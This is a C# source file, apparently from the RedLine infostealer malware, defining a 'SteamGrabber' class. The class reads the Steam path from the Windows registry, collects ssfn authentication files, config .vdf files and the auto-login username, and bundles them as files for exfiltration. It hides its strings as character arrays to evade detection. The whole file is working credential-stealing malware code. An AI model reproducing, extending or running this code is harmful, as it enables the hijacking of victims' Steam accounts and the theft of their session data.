using System.Collections.Generic;
using System.IO;
using System.Text;
using Microsoft.Win32;
using RedLine.Reburn.Models.Info;

namespace RedLine.Reburn.Data.Applications;

public static class SteamGrabber
{
	public static List<RemoteFile> ParseFiles()
	{
		List<RemoteFile> list = new List<RemoteFile>();
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(new string(new char[20]
			{
				'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\', 'V',
				'a', 'l', 'v', 'e', '\\', 'S', 't', 'e', 'a', 'm'
			}));
			if (registryKey == null)
			{
				return list;
			}
			string empty = string.Empty;
			empty = registryKey.GetValue(new string(new char[9] { 'S', 't', 'e', 'a', 'm', 'P', 'a', 't', 'h' })) as string;
			if (!Directory.Exists(empty))
			{
				return list;
			}
			string[] files = Directory.GetFiles(empty);
			foreach (string text in files)
			{
				if (text.Contains(new string(new char[4] { 's', 's', 'f', 'n' })))
				{
					list.Add(new RemoteFile
					{
						Body = File.ReadAllBytes(text),
						FileName = Path.GetFileName(text)
					});
				}
			}
			foreach (string item in Directory.EnumerateFiles(Path.Combine(empty, new string(new char[6] { 'c', 'o', 'n', 'f', 'i', 'g' }))))
			{
				if (item.Contains(new string(new char[4] { '.', 'v', 'd', 'f' })))
				{
					list.Add(new RemoteFile
					{
						Body = File.ReadAllBytes(item),
						FileName = Path.GetFileName(new string(new char[7] { 'c', 'o', 'n', 'f', 'i', 'g', '_' }) + item)
					});
				}
			}
			string text2 = registryKey.GetValue(new string(new char[13]
			{
				'A', 'u', 't', 'o', 'L', 'o', 'g', 'i', 'n', 'U',
				's', 'e', 'r'
			})) as string;
			if (!string.IsNullOrWhiteSpace(text2))
			{
				list.Add(new RemoteFile
				{
					Body = Encoding.UTF8.GetBytes(new string(new char[6] { 'U', 's', 'e', 'r', ':', ' ' }) + text2),
					FileName = new string(new char[15]
					{
						'A', 'c', 'c', 'o', 'u', 'n', 't', 'I', 'n', 'f',
						'o', '.', 't', 'x', 't'
					})
				});
				return list;
			}
			return list;
		}
		catch
		{
			return list;
		}
	}
}
